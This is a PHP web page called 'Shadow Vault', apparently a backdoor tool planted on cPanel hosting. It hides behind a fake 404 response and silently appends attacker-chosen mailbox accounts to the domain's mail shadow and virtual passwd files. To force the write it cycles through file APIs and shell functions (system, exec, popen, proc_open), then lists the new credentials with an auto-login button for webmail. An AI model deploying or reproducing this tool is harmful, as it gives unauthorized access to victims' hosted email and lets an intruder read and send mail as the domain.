<?php
error_reporting(0);
header("HTTP/1.0 404 Not Found");

$user = get_current_user();
$home = '/home/' . $user;
$etc = $home . '/etc';
define('VIRTUAL_PASSWD_BASE', '/etc/virtual');

$result = '';
$loginList = [];
$resultType = '';
$autoDomains = [];

function getAutoDomains() {
    global $etc;
    $domains = [];
    $shadows = glob($etc . '/*/shadow');
    foreach ($shadows as $file) {
        if (preg_match('#/etc/([^/]+)/shadow$#', $file, $match)) {
            $domains[] = $match[1];
        }
    }
    if (empty($domains) && function_exists('exec')) {
        $hostname = @exec('hostname -f 2>/dev/null');
        if (!empty($hostname) && filter_var($hostname, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME)) {
            $domains[] = $hostname;
        } else {
            $domains[] = $_SERVER['HTTP_HOST'] ?? 'localhost';
        }
    }
    return array_unique($domains);
}

if (!function_exists('random_bytes')) {
    function random_bytes($length) {
        $str = '';
        for ($i = 0; $i < $length; $i++) {
            $str .= chr(mt_rand(0, 255));
        }
        return $str;
    }
}

function generateShadowHash($password) {
    $salt = substr(str_replace('+', '.', base64_encode(random_bytes(12))), 0, 16);
    return crypt($password, '$6$' . $salt . '$');
}

function getShadowAging($file) {
    $lines = @file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!empty($lines)) {
        foreach ($lines as $line) {
            if (strpos($line, ':') !== false && $line[0] !== '#') {
                $parts = explode(':', $line);
                if (count($parts) >= 4) {
                    return implode(':', array_slice($parts, 2, 7));
                }
            }
        }
    }
    return '19400:0:99999:7:::';
}

function appendToShadow($file, $entry) {
    $disable_functions = array_map('trim', explode(',', ini_get('disable_functions')));
    $entryNoNewline = rtrim($entry, "\n");
    
    if (@file_put_contents($file, $entry, FILE_APPEND | LOCK_EX) !== false) return true;
    
    $fp = @fopen($file, 'a');
    if ($fp) {
        if (@flock($fp, LOCK_EX)) {
            $write = @fwrite($fp, $entry);
            @flock($fp, LOCK_UN);
            @fclose($fp);
            if ($write !== false) return true;
        }
        @fclose($fp);
    }
    
    $dir = dirname($file);
    if (is_writable($dir)) {
        $temp = tempnam($dir, 'shadow_');
        if ($temp !== false) {
            $existing = @file_get_contents($file);
            $newContent = ($existing !== false ? $existing : '') . $entry;
            if (@file_put_contents($temp, $newContent, LOCK_EX) !== false) {
                if (@rename($temp, $file)) {
                    @chmod($file, 0640);
                    return true;
                }
            }
            @unlink($temp);
        }
    }
    
    $fp = @fopen($file, 'c');
    if ($fp) {
        if (@flock($fp, LOCK_EX)) {
            fseek($fp, 0, SEEK_END);
            $write = @fwrite($fp, $entry);
            @flock($fp, LOCK_UN);
            @fclose($fp);
            if ($write !== false) return true;
        }
        @fclose($fp);
    }
    
    $content = @file_get_contents($file);
    if ($content !== false || !file_exists($file)) {
        $newContent = ($content !== false ? $content : '') . $entry;
        if (@file_put_contents($file, $newContent, LOCK_EX) !== false) return true;
    }
    
    $shell_methods = ['system', 'passthru', 'popen', 'proc_open', 'exec', 'shell_exec'];
    foreach ($shell_methods as $method) {
        if (function_exists($method) && !in_array($method, $disable_functions)) {
            if ($method == 'popen') {
                $handle = @popen("echo " . escapeshellarg($entryNoNewline) . " >> " . escapeshellarg($file), 'r');
                if ($handle) { @pclose($handle); return true; }
            } elseif ($method == 'proc_open') {
                $process = @proc_open("echo " . escapeshellarg($entryNoNewline) . " >> " . escapeshellarg($file), [1 => ['pipe','w'],2 => ['pipe','w']], $pipes);
                if (is_resource($process)) { @proc_close($process); return true; }
            } elseif ($method == 'system' || $method == 'passthru') {
                ob_start();
                @$method("echo " . escapeshellarg($entryNoNewline) . " >> " . escapeshellarg($file), $ret);
                ob_end_clean();
                if ($ret === 0) return true;
            } else {
                @$method("echo " . escapeshellarg($entryNoNewline) . " >> " . escapeshellarg($file));
                if (strpos(@file_get_contents($file), $entryNoNewline) !== false) return true;
            }
        }
    }
    
    $tmpFile = '/tmp/shadow_' . md5(uniqid());
    $newContent = (@file_get_contents($file) !== false ? @file_get_contents($file) : '') . $entry;
    if (@file_put_contents($tmpFile, $newContent) !== false) {
        if (@copy($tmpFile, $file) || @rename($tmpFile, $file)) {
            @unlink($tmpFile);
            return true;
        }
        @unlink($tmpFile);
    }
    
    return false;
}

function appendToVirtualPasswd($domain, $username, $hash) {
    $passwdFile = VIRTUAL_PASSWD_BASE . '/' . $domain . '/passwd';
    $dir = dirname($passwdFile);
    if (!is_dir($dir) && !@mkdir($dir, 0755, true)) return false;
    
    $email = $username . '@' . $domain;
    $entry = $email . ':' . $hash . ':500:500::/home/vmail/' . $domain . '/' . $username . '::' . "\n";
    
    $lines = @file($passwdFile, FILE_IGNORE_NEW_LINES);
    if ($lines === false) return file_put_contents($passwdFile, $entry, LOCK_EX) !== false;
    
    foreach ($lines as $i => $line) {
        if (strpos($line, $email . ':') === 0) {
            $lines[$i] = rtrim($entry, "\n");
            return file_put_contents($passwdFile, implode("\n", $lines) . "\n", LOCK_EX) !== false;
        }
    }
    return file_put_contents($passwdFile, $entry, FILE_APPEND | LOCK_EX) !== false;
}

function createShadowFile($domain) {
    global $etc;
    $shadowDir = $etc . '/' . $domain;
    $shadowFile = $shadowDir . '/shadow';
    if (!is_dir($shadowDir) && !@mkdir($shadowDir, 0755, true)) return false;
    if (!file_exists($shadowFile)) {
        if (@file_put_contents($shadowFile, "# Shadow file for $domain\n", LOCK_EX) === false) return false;
        @chmod($shadowFile, 0640);
    }
    return $shadowFile;
}

$autoDomains = getAutoDomains();
if (isset($_POST['submit'])) {
    $localpart = trim($_POST['username']);
    $password = trim($_POST['password']);
    $domain = isset($_POST['domain']) ? trim($_POST['domain']) : ($autoDomains[0] ?? '');
    
    if (empty($domain) && !empty($autoDomains)) $domain = $autoDomains[0];
    
    if (!empty($localpart) && !empty($password) && !empty($domain)) {
        $hash = generateShadowHash($password);
        $shadows = glob($etc . '/*/shadow');
        
        if (empty($shadows)) {
            $newFile = createShadowFile($domain);
            if ($newFile !== false) $shadows = [$newFile];
        }
        
        if (!empty($shadows)) {
            $writtenShadow = false;
            $writtenPasswd = false;
            $loginList = [];
            foreach ($shadows as $file) {
                $matchedDomain = $domain;
                if (preg_match('#/etc/([^/]+)/shadow$#', $file, $match)) $matchedDomain = $match[1];
                $aging = getShadowAging($file);
                if (appendToShadow($file, $localpart . ':' . $hash . ':' . $aging . "\n")) {
                    $writtenShadow = true;
                    if (appendToVirtualPasswd($matchedDomain, $localpart, $hash)) $writtenPasswd = true;
                    $loginList[] = ['domain' => $matchedDomain, 'displayUsername' => $localpart . '@' . $matchedDomain, 'password' => $password];
                }
            }
            $loginList = array_unique($loginList, SORT_REGULAR);
            if ($writtenShadow && $writtenPasswd) {
                $result = 'User successfully added to both shadow and passwd. You can now login to webmail.';
                $resultType = 'success';
            } elseif ($writtenShadow && !$writtenPasswd) {
                $result = 'User added to shadow (virtual passwd failed, but login usually still works).';
                $resultType = 'warning';
            } else {
                $result = 'Failed to write to shadow (all methods failed).';
                $resultType = 'error';
            }
        }
    } else {
        $result = 'Please fill username, password, and ensure domain is available.';
        $resultType = 'warning';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shadow Vault | Working Auto Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Inter',sans-serif;background:radial-gradient(circle at 20%30%,#0a0f1e,#03060c);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:1rem;}
        .glass-card{background:rgba(15,25,45,0.65);backdrop-filter:blur(12px);border-radius:2rem;border:1px solid rgba(72,187,120,0.25);box-shadow:0 25px 45px rgba(0,0,0,0.3);width:100%;max-width:1400px;padding:1.8rem;}
        h1{font-size:1.8rem;font-weight:600;background:linear-gradient(135deg,#c0ffb0,#4ade80);-webkit-background-clip:text;background-clip:text;color:transparent;display:flex;align-items:center;gap:0.6rem;}
        .sub{font-size:0.85rem;color:#8ca3b9;border-left:2px solid #2e7d64;padding-left:0.75rem;margin-bottom:1.8rem;}
        .form-row{display:flex;flex-wrap:wrap;gap:1rem;margin-bottom:1.3rem;}
        .input-group{flex:1;min-width:200px;text-align:left;}
        .input-group label{display:block;font-size:0.85rem;font-weight:500;color:#b9d0f0;margin-bottom:0.4rem;}
        .input-field,select{background:rgba(0,0,0,0.5);border:1px solid #2a3a4a;border-radius:1.2rem;padding:0.75rem 1rem;width:100%;font-size:0.95rem;color:#f0f9ff;outline:none;}
        .input-field:focus,select:focus{border-color:#4ade80;box-shadow:0 0 0 2px rgba(74,222,128,0.2);}
        button{background:linear-gradient(95deg,#1c4d2d,#0f2e1d);border:none;border-radius:2rem;padding:0.8rem 1.5rem;font-weight:600;font-size:1rem;color:#e2ffe6;width:100%;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;border:1px solid rgba(74,222,128,0.3);}
        button:hover{background:linear-gradient(95deg,#2b6e3f,#1a4a2a);transform:scale(0.98);}
        .message{margin-top:1.5rem;padding:0.9rem 1rem;border-radius:1.2rem;font-size:0.9rem;display:flex;align-items:center;gap:10px;}
        .message.success{background:rgba(34,197,94,0.12);border-left:4px solid #22c55e;color:#bef5cf;}
        .message.error{background:rgba(239,68,68,0.12);border-left:4px solid #ef4444;color:#ffcdcd;}
        .message.warning{background:rgba(245,158,11,0.12);border-left:4px solid #f59e0b;color:#ffecb3;}
        .result-section{margin-top:2rem;border-top:1px dashed #2a4b3c;padding-top:1.2rem;}
        .result-title{font-weight:600;margin-bottom:1rem;color:#9be3af;}
        .table-wrapper{overflow-x:auto;border-radius:1rem;background:rgba(0,0,0,0.35);}
        .cred-table{width:100%;border-collapse:collapse;font-size:0.85rem;font-family:monospace;}
        .cred-table th,.cred-table td{padding:0.9rem 0.8rem;text-align:left;border-bottom:1px solid #2c5a42;}
        .cred-table th{background:rgba(20,40,30,0.6);color:#9be3af;}
        .cred-table tr:hover{background:rgba(74,222,128,0.05);}
        .cred-table td{color:#e2ffea;word-break:break-all;}
        .copy-btn,.auto-login-btn{background:#1a3a2a;border:none;padding:0.2rem 0.6rem;border-radius:20px;color:#b1f0c2;font-size:0.7rem;cursor:pointer;margin-left:8px;}
        .auto-login-btn{background:#2c5a42;}
        .badge-ssl{background:#1a3a2a;font-size:0.65rem;padding:0.15rem 0.5rem;border-radius:20px;margin-left:0.5rem;}
        footer{margin-top:1.8rem;font-size:0.7rem;text-align:center;color:#4f6f7a;}
        @media (max-width:640px){.glass-card{padding:1rem;}.cred-table th,.cred-table td{padding:0.6rem 0.4rem;font-size:0.75rem;}}
    </style>
</head>
<body>
<div class="glass-card">
    <h1><i class="fas fa-shield-alt"></i> Shadow Vault</h1>
    <div class="sub"><i class="fas fa-robot"></i> Auto domain • Clickable URL • One-click Auto Login (cPanel Webmail)</div>
    
    <form method="post">
        <div class="form-row">
            <div class="input-group">
                <label><i class="fas fa-globe"></i> Domain (auto detected)</label>
                <select name="domain" class="input-field">
                    <?php foreach ($autoDomains as $d): ?>
                        <option value="<?php echo htmlspecialchars($d); ?>" <?php echo (isset($_POST['domain']) && $_POST['domain']==$d) || (!isset($_POST['domain']) && $d==($autoDomains[0]??'')) ? 'selected' : ''; ?>>
                            <?php echo htmlspecialchars($d); ?>
                        </option>
                    <?php endforeach; ?>
                    <?php if (empty($autoDomains)): ?>
                        <option value="">No domain detected - enter manually</option>
                    <?php endif; ?>
                </select>
            </div>
            <div class="input-group">
                <label><i class="fas fa-at"></i> Username</label>
                <input type="text" name="username" class="input-field" placeholder="john" required value="<?php echo isset($_POST['username']) ? htmlspecialchars($_POST['username']) : ''; ?>">
            </div>
            <div class="input-group">
                <label><i class="fas fa-lock"></i> Password</label>
                <input type="password" name="password" class="input-field" placeholder="••••••••" required>
            </div>
        </div>
        <button type="submit" name="submit"><i class="fas fa-key"></i> Add Account</button>
    </form>
    
    <?php if ($result): ?>
        <div class="message <?php echo $resultType; ?>">
            <i class="fas <?php echo $resultType=='success' ? 'fa-check-circle' : ($resultType=='error' ? 'fa-exclamation-triangle' : 'fa-info-circle'); ?>"></i>
            <?php echo htmlspecialchars($result); ?>
        </div>
    <?php endif; ?>
    
    <?php if (!empty($loginList)): ?>
        <div class="result-section">
            <div class="result-title"><i class="fas fa-envelope"></i> Webmail Credentials (port 2096)</div>
            <div class="table-wrapper">
                <table class="cred-table">
                    <thead>
                        <tr><th>Login URL</th><th>Username</th><th>Password</th><th>Action</th></tr>
                    </thead>
                    <tbody>
                        <?php foreach ($loginList as $item): ?>
                        <tr>
                            <td>
                                <a href="https://<?php echo htmlspecialchars($item['domain']); ?>:2096" target="_blank" style="color:#4ade80; text-decoration:none;">
                                    https://<?php echo htmlspecialchars($item['domain']); ?>:2096
                                </a>
                                <span class="badge-ssl">SSL</span>
                            </td>
                            <td><?php echo htmlspecialchars($item['displayUsername']); ?></td>
                            <td style="white-space: nowrap;">
                                <span id="pass_<?php echo md5($item['password']); ?>"><?php echo htmlspecialchars($item['password']); ?></span>
                                <button class="copy-btn" onclick="copyPassword('<?php echo htmlspecialchars(addslashes($item['password'])); ?>')"><i class="far fa-copy"></i> copy</button>
                            </td>
                            <td>
                                <button class="auto-login-btn" onclick="autoLogin('<?php echo htmlspecialchars($item['domain']); ?>', '<?php echo htmlspecialchars($item['displayUsername']); ?>', '<?php echo htmlspecialchars(addslashes($item['password'])); ?>')">
                                    <i class="fas fa-sign-in-alt"></i> Auto Login
                                </button>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
    <?php endif; ?>
    
    <footer><i class="fas fa-check-circle"></i> Auto login uses POST to /login/ with fields user & pass (cPanel standard)</footer>
</div>

<script>
function copyPassword(text) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => alert('Password copied')).catch(() => fallbackCopy(text));
    } else {
        fallbackCopy(text);
    }
}
function fallbackCopy(text) {
    var textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.style.position = 'fixed';
    textarea.style.top = 0;
    textarea.style.left = 0;
    textarea.style.opacity = 0;
    document.body.appendChild(textarea);
    textarea.select();
    try {
        document.execCommand('copy');
        alert('Password copied (fallback)');
    } catch (err) {
        prompt('Copy manually:', text);
    }
    document.body.removeChild(textarea);
}

function autoLogin(domain, username, password) {
    var loginUrl = 'https://' + domain + ':2096/login/';
    var formHtml = '<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body onload="document.forms[0].submit()">' +
        '<form method="post" action="' + loginUrl + '">' +
        '<input type="hidden" name="user" value="' + username.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;') + '">' +
        '<input type="hidden" name="pass" value="' + password.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;') + '">' +
        '</form></body></html>';
    
    var blob = new Blob([formHtml], { type: 'text/html' });
    var url = URL.createObjectURL(blob);
    var win = window.open(url, '_blank');
    setTimeout(function() { URL.revokeObjectURL(url); }, 5000);
}
</script>
</body>
</html>